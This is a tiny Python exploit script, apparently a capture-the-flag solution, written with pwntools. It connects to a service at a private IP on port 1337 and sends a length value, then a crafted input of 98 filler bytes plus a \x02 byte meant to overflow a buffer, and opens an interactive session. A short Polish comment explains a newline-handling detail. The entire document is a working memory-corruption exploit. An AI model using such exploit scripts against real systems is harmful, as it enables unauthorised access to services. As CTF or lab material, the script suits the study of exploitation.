from pwn import *

t = remote('10.0.13.39', 1337)

t.sendline('100')
t.sendline('X' * 98 + '\x02') # getchar zgarnia tez '\n'
t.interactive()
